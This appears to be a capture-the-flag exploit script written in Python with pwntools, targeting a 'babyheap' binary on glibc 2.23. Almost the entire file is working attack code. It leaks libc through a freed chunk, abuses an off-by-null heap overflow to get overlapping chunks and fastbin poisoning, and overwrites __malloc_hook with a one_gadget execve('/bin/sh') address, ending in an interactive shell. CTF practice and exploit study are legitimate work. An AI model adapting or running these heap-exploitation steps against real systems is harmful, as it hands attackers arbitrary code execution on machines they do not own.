from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	pass

def menu(choice):
	p.sendafter(">> \n",str(choice) + "\x00")

def add(size,content):
	menu(1)
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def edit(index,size,content):
	menu(2)
	p.sendafter("input index\n",str(index) + "\x00")
	p.sendafter("input your name size\n",str(size) + "\x00")
	p.sendafter("input your name\n",content)

def show(index):
	menu(3)
	p.sendafter("input index\n",str(index) + "\x00")

def free(index):
	menu(4)
	p.sendafter("input index\n",str(index) + "\x00")

def debugf():
	if debug:
		gdb.attach(p,"b *0x0000000000400CCD")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
add(0xf8,"a\n")
add(0xf8,"b\n")
free(0)
add(0xf8,"a\n")
p0 = "a" * 8
edit(0,len(p0),p0)
show(0)
p.recvuntil("a" * 8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))

free(0)
free(1)
# off by null
add(0x18,"a\n") #0
p1 = "\x00" * 0xf0
p1 += p64(0x100) + p64(0x11)
add(0x108,p1 + "\n") #1
add(0xf8,"c\n") #2
free(1)
p2 = "\x00" * 0x18
p2 += "\x00"
edit(0,len(p2),p2)
add(0x88,"b1\n") #1
add(0x68,"b2\n") #3
free(1)
free(2)
free(3)
target = libc.symbols["__malloc_hook"] - 0x23
p3 = "\x00" * 0x88 + p64(0x71)
p3 += p64(target)
add(0x110 + 0x100 - 0x10,p3 + "\n") #1

"""
one_gadget /lib/x86_64-linux-gnu/libc-2.23.so
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
one_gadget = libc.address + 0xf03a4
add(0x68,"a\n") #2
p2 = "aaa" + p64(0) * 2 + p64(one_gadget)
p2 += "\n"
add(0x68,p2) #3
free(3)
p.interactive()
